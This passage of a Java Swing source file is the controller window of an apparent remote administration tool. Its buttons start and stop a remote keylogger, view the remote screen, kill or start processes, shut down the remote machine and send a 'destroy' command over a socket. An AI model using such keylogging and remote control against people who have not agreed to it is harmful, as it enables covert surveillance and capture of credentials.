        javax.swing.GroupLayout pnlSystemInfoLayout = new javax.swing.GroupLayout(pnlSystemInfo);
        pnlSystemInfo.setLayout(pnlSystemInfoLayout);
        pnlSystemInfoLayout.setHorizontalGroup(
            pnlSystemInfoLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(pnlSystemInfoLayout.createSequentialGroup()
                .addGroup(pnlSystemInfoLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(pnlSystemInfoLayout.createSequentialGroup()
                        .addGap(44, 44, 44)
                        .addGroup(pnlSystemInfoLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                            .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 225, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 416, Short.MAX_VALUE)
                            .addComponent(jSeparator4)))
                    .addGroup(pnlSystemInfoLayout.createSequentialGroup()
                        .addGap(133, 133, 133)
                        .addComponent(btnDirInfo, javax.swing.GroupLayout.PREFERRED_SIZE, 100, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(18, 18, 18)
                        .addComponent(btnSaveInfo, javax.swing.GroupLayout.PREFERRED_SIZE, 100, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap(48, Short.MAX_VALUE))
        );
        pnlSystemInfoLayout.setVerticalGroup(
            pnlSystemInfoLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(pnlSystemInfoLayout.createSequentialGroup()
                .addGap(36, 36, 36)
                .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 24, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jSeparator4, javax.swing.GroupLayout.PREFERRED_SIZE, 10, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(8, 8, 8)
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 376, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(18, 18, 18)
                .addGroup(pnlSystemInfoLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(btnDirInfo, javax.swing.GroupLayout.PREFERRED_SIZE, 32, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(btnSaveInfo, javax.swing.GroupLayout.PREFERRED_SIZE, 32, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addContainerGap(8, Short.MAX_VALUE))
        );

        btnLogOut.setText("Log out");
        btnLogOut.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnLogOut.setFocusable(false);
        btnLogOut.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnLogOutActionPerformed(evt);
            }
        });

        btnRestart.setText("Restart");
        btnRestart.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnRestart.setFocusable(false);
        btnRestart.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnRestartActionPerformed(evt);
            }
        });

        btnShutdown.setText("Shut down");
        btnShutdown.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnShutdown.setFocusable(false);
        btnShutdown.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnShutdownActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout pnlSystemCmdLayout = new javax.swing.GroupLayout(pnlSystemCmd);
        pnlSystemCmd.setLayout(pnlSystemCmdLayout);
        pnlSystemCmdLayout.setHorizontalGroup(
            pnlSystemCmdLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(pnlSystemCmdLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jSeparator1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(78, 78, 78)
                .addGroup(pnlSystemCmdLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(btnShutdown, javax.swing.GroupLayout.DEFAULT_SIZE, 95, Short.MAX_VALUE)
                    .addComponent(btnRestart, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(btnLogOut, javax.swing.GroupLayout.DEFAULT_SIZE, 95, Short.MAX_VALUE))
                .addContainerGap(95, Short.MAX_VALUE))
        );
        pnlSystemCmdLayout.setVerticalGroup(
            pnlSystemCmdLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(pnlSystemCmdLayout.createSequentialGroup()
                .addGroup(pnlSystemCmdLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(pnlSystemCmdLayout.createSequentialGroup()
                        .addGap(163, 163, 163)
                        .addComponent(btnLogOut, javax.swing.GroupLayout.PREFERRED_SIZE, 45, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(btnRestart, javax.swing.GroupLayout.PREFERRED_SIZE, 44, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(btnShutdown, javax.swing.GroupLayout.PREFERRED_SIZE, 53, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(pnlSystemCmdLayout.createSequentialGroup()
                        .addGap(92, 92, 92)
                        .addComponent(jSeparator1, javax.swing.GroupLayout.PREFERRED_SIZE, 322, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        javax.swing.GroupLayout pnlSystemLayout = new javax.swing.GroupLayout(pnlSystem);
        pnlSystem.setLayout(pnlSystemLayout);
        pnlSystemLayout.setHorizontalGroup(
            pnlSystemLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(pnlSystemLayout.createSequentialGroup()
                .addComponent(pnlSystemInfo, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(pnlSystemCmd, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
        );
        pnlSystemLayout.setVerticalGroup(
            pnlSystemLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(pnlSystemInfo, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
            .addComponent(pnlSystemCmd, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );

        tabMain.addTab("System", pnlSystem);

        tabMain.setSelectedIndex(-1);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(tabMain, javax.swing.GroupLayout.PREFERRED_SIZE, 885, javax.swing.GroupLayout.PREFERRED_SIZE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addComponent(tabMain)
                .addContainerGap())
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void formWindowClosing(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_formWindowClosing
        setSelectedTab(-1);
        homeGUI.btnControl.setEnabled(true);
        homeGUI.btnDisconnect.setEnabled(true);
        homeGUI.btnDestroy.setEnabled(true);
    }//GEN-LAST:event_formWindowClosing

    public void disconnect() {
        BufferedWriter out = null;
        try {
            out = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
            out.write("<DISC>$<>\n");
            out.flush();
            socket.close();
            socket = null;
            processes.close();
            applications.close();
            monitor.close();
            keyLogger.close();
            systemCtrl.close();

        } catch (IOException ex) {
            Logger.getLogger(ControlGUI.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public void setSelectedTab(int index) {
        tabMain.setSelectedIndex(index);
        selectedTab = index;
    }
    
    public void destroy() {
        BufferedWriter out = null;
        try {
            out = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
            out.write("<DESTROY>$<>\n");
            out.flush();
            socket.close();
            socket = null;
            processes.close();
            applications.close();
            monitor.close();
            keyLogger.close();
            systemCtrl.close();
        } catch (IOException ex) {
            Logger.getLogger(ControlGUI.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    private void tabMainStateChanged(javax.swing.event.ChangeEvent evt) {//GEN-FIRST:event_tabMainStateChanged
        do {
            if (socket == null || socket.isClosed()) {
                return;
            }

            if (selectedTab == 3 && btnKeyLog.isSelected()) {
                btnKeyLog.doClick();
                break;
            }
        } while (false);

        selectedTab = ((javax.swing.JTabbedPane) evt.getSource()).getSelectedIndex();

        switch (selectedTab) {
            case 0 -> {
                processes.getProcesses();
            }
            case 1 -> {
                applications.getApplications();
            }
            case 2 -> {
                monitor.getMonitor();
            }

            case 3 -> {
                btnKeyLog.doClick();
            }
            case 4 -> {
                systemCtrl.getSystemInfo();
            }

        }
    }//GEN-LAST:event_tabMainStateChanged

    private void btnShutdownActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnShutdownActionPerformed
        systemCtrl.shutDown();
        JOptionPane.showMessageDialog(rootPane, "The COM will shut down in 10s.");
    }//GEN-LAST:event_btnShutdownActionPerformed

    private void btnSaveMonitorActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnSaveMonitorActionPerformed
        monitor.saveMonitor();
    }//GEN-LAST:event_btnSaveMonitorActionPerformed

    private void btnDirProcActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnDirProcActionPerformed
        int r = fileChooserGUI.showOpenDialog(null);
        if (r == JFileChooser.APPROVE_OPTION) {
            processes.saveLocation = fileChooserGUI.getSelectedFile().getAbsolutePath();
        }
    }//GEN-LAST:event_btnDirProcActionPerformed

    private void btnLogOutActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnLogOutActionPerformed
        systemCtrl.logOut();
        JOptionPane.showMessageDialog(rootPane, "The COM will log off in 10s.");
    }//GEN-LAST:event_btnLogOutActionPerformed

    private void btnRestartActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnRestartActionPerformed
        systemCtrl.restart();
        JOptionPane.showMessageDialog(rootPane, "The COM will restart in 10s.");
    }//GEN-LAST:event_btnRestartActionPerformed

    private void btnDirKeyActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnDirKeyActionPerformed
        keyLogger.saveLog();
    }//GEN-LAST:event_btnDirKeyActionPerformed

    private void btnKeyLogActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnKeyLogActionPerformed
        try {
            if (btnKeyLog.isSelected()) {
                btnKeyLog.setText("STOP");
                keyLogger.startKeyLog();
            } else {
                btnKeyLog.setText("START");
                keyLogger.stopKeyLog();
            }
        } catch (IOException ex) {
            Logger.getLogger(ControlGUI.class.getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_btnKeyLogActionPerformed

    private void btnKillAppActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnKillAppActionPerformed
        applications.killApp();
    }//GEN-LAST:event_btnKillAppActionPerformed

    private void btnDirMonitorActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnDirMonitorActionPerformed
        int r = fileChooserGUI.showOpenDialog(null);
        if (r == JFileChooser.APPROVE_OPTION) {
            monitor.saveLocation = fileChooserGUI.getSelectedFile().getAbsolutePath();
        }
    }//GEN-LAST:event_btnDirMonitorActionPerformed

    private void btnSaveKeyActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnSaveKeyActionPerformed
        int r = fileChooserGUI.showOpenDialog(null);
        if (r == JFileChooser.APPROVE_OPTION) {
            keyLogger.saveLocation = fileChooserGUI.getSelectedFile().getAbsolutePath();
        }
    }//GEN-LAST:event_btnSaveKeyActionPerformed

    private void btnClearKeyLogActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnClearKeyLogActionPerformed
        txtKeylog.setText("");
    }//GEN-LAST:event_btnClearKeyLogActionPerformed

    private void btnSaveProcActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnSaveProcActionPerformed
        processes.save();
    }//GEN-LAST:event_btnSaveProcActionPerformed

    private void btnOpenStartProcActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnOpenStartProcActionPerformed
        startProcGUI.setLocationRelativeTo(this);
        startProcGUI.setVisible(true);
        btnOpenStartProc.setEnabled(false);
    }//GEN-LAST:event_btnOpenStartProcActionPerformed

    private void btnDirInfoActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnDirInfoActionPerformed
        int r = fileChooserGUI.showOpenDialog(null);
        if (r == JFileChooser.APPROVE_OPTION) {
            systemCtrl.saveLocation = fileChooserGUI.getSelectedFile().getAbsolutePath();
        }
    }//GEN-LAST:event_btnDirInfoActionPerformed

    private void btnSaveInfoActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnSaveInfoActionPerformed
        systemCtrl.save();
    }//GEN-LAST:event_btnSaveInfoActionPerformed

    private void btnStartAppBySelectionActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnStartAppBySelectionActionPerformed
        applications.startAppBySelection();
    }//GEN-LAST:event_btnStartAppBySelectionActionPerformed

    private void btnOpenStartAppActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnOpenStartAppActionPerformed
        startAppGUI.setLocationRelativeTo(this);
        startAppGUI.setVisible(true);
        btnOpenStartApp.setEnabled(false);
    }//GEN-LAST:event_btnOpenStartAppActionPerformed

    private void startAppGUIWindowClosing(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_startAppGUIWindowClosing
        btnOpenStartApp.setEnabled(true);
    }//GEN-LAST:event_startAppGUIWindowClosing

    private void btnDirAppActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnDirAppActionPerformed
        int r = fileChooserGUI.showOpenDialog(null);
        if (r == JFileChooser.APPROVE_OPTION) {
            applications.saveLocation = fileChooserGUI.getSelectedFile().getAbsolutePath();
        }
    }//GEN-LAST:event_btnDirAppActionPerformed

    private void btnStartProcBySelectionActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnStartProcBySelectionActionPerformed
        processes.startProcBySelection();
    }//GEN-LAST:event_btnStartProcBySelectionActionPerformed

    private void startProcGUIWindowClosing(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_startProcGUIWindowClosing
        btnOpenStartProc.setEnabled(true);
    }//GEN-LAST:event_startProcGUIWindowClosing

    private void btnKillProcActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnKillProcActionPerformed
        processes.killProc();
    }//GEN-LAST:event_btnKillProcActionPerformed

    private void btnStartProcByNameActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnStartProcByNameActionPerformed
        processes.startProcByName();
    }//GEN-LAST:event_btnStartProcByNameActionPerformed

    private void btnStartAppByNameActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnStartAppByNameActionPerformed
        applications.startAppByName();
    }//GEN-LAST:event_btnStartAppByNameActionPerformed

    private void btnSaveAppActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnSaveAppActionPerformed
        applications.save();
    }//GEN-LAST:event_btnSaveAppActionPerformed

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton btnClearKeyLog;
    private javax.swing.JButton btnDirApp;
    private javax.swing.JButton btnDirInfo;
    private javax.swing.JButton btnDirKey;
    private javax.swing.JButton btnDirMonitor;
    private javax.swing.JButton btnDirProc;
    public javax.swing.JToggleButton btnKeyLog;
    private javax.swing.JButton btnKillApp;
    private javax.swing.JButton btnKillProc;
    private javax.swing.JButton btnLogOut;
    private javax.swing.JButton btnOpenStartApp;
    private javax.swing.JButton btnOpenStartProc;
    private javax.swing.JButton btnRestart;
    private javax.swing.JButton btnSaveApp;
    private javax.swing.JButton btnSaveInfo;
    private javax.swing.JButton btnSaveKey;
    private javax.swing.JButton btnSaveMonitor;
    private javax.swing.JButton btnSaveProc;
    private javax.swing.JButton btnShutdown;
    private javax.swing.JButton btnStartAppByName;
    private javax.swing.JButton btnStartAppBySelection;
    private javax.swing.JButton btnStartProcByName;
    private javax.swing.JButton btnStartProcBySelection;
    private javax.swing.JFileChooser fileChooserGUI;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JScrollPane jScrollPane3;
    private javax.swing.JScrollPane jScrollPane4;
    private javax.swing.JScrollPane jScrollPane5;
    private javax.swing.JScrollPane jScrollPane6;
    private javax.swing.JSeparator jSeparator1;
    private javax.swing.JSeparator jSeparator2;
    private javax.swing.JSeparator jSeparator3;
    private javax.swing.JSeparator jSeparator4;
    private javax.swing.JPanel pnlApp;
    public javax.swing.JPanel pnlCenterMonitor;
    private javax.swing.JPanel pnlKeylog;
    private javax.swing.JPanel pnlMonitor;
    private javax.swing.JPanel pnlProcess;
    private javax.swing.JPanel pnlSystem;
    private javax.swing.JPanel pnlSystemCmd;
    private javax.swing.JPanel pnlSystemInfo;
    public javax.swing.JFrame startAppGUI;
    public javax.swing.JFrame startProcGUI;
    private javax.swing.JTabbedPane tabMain;
    public javax.swing.JTable tblApp;
    public javax.swing.JTable tblProcess;
    public javax.swing.JTable tblStartApp;
    public javax.swing.JTable tblStartProc;
    public javax.swing.JTextArea txtKeylog;
    public javax.swing.JTextField txtStartApp;
    public javax.swing.JTextField txtStartProc;
    public javax.swing.JTextArea txtSystemInfo;
    // End of variables declaration//GEN-END:variables
}
